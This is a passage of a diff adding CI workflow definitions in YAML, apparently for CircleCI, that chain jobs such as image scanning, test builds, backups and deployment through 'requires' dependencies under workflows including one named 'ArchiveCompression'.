+            - identity-service-audit-split-4
+      - agentBundle:
+          requires:
+            - ResolveDaemonDependenciesStep9
+      - StorageDeploymentHealthCheck:
+          requires:
+            - agentBundle
+      - AssembleMobileAppTestBuild:
+          requires:
+            - agentBundle
+      - import-database-snapshot:
+          requires:
+            - AssembleMobileAppTestBuild
+      - WeeklySizeAnalysisHookStep3:
+          requires:
+            - import-database-snapshot
+      - syncConsoleTutorials:
+          requires:
+            - import-database-snapshot
+      - billing-test-logs:
+          requires:
+            - syncConsoleTutorials
+      - WatchLogOutput:
+          requires:
+            - billing-test-logs
+  ArchiveCompression:
+    jobs:
+      - Validator
+      - ConfigureAndStartDeploymentRun3:
+          requires:
+            - Validator
+      - PreliminaryStyleCheck:
+          requires:
+            - Validator
+      - provisionConsoleDatabase:
+          requires:
+            - PreliminaryStyleCheck
+      - monitor-executable:
+          requires:
+            - PreliminaryStyleCheck
+      - automatic-repository-checkout:
+          requires:
+            - monitor-executable
+      - LegacyConfigurationBackup:
+          requires:
+            - monitor-executable
+      - scan-base-image:
+          requires:
+            - LegacyConfigurationBackup
+      - write-gateway-dependency-tree:
+          requires:
+            - LegacyConfigurationBackup
+      - OptimizeObjectFiles:
+          requires:
+            - write-gateway-dependency-tree
+      - InspectContainerImageForAudit:
+          requires:
+            - write-gateway-dependency-tree
+      - test-and-deploy-validator:
+          requires:
+            - InspectContainerImageForAudit
+      - StripRateLimiterSharedLibrary:
+          requires:
+            - InspectContainerImageForAudit
+      - message-broker-state-backup:
+          requires:
+            - StripRateLimiterSharedLibrary
+      - PreUploadTests:
+          requires:
+            - StripRateLimiterSharedLibrary
+      - notification-step:
+          requires:
+            - PreUploadTests
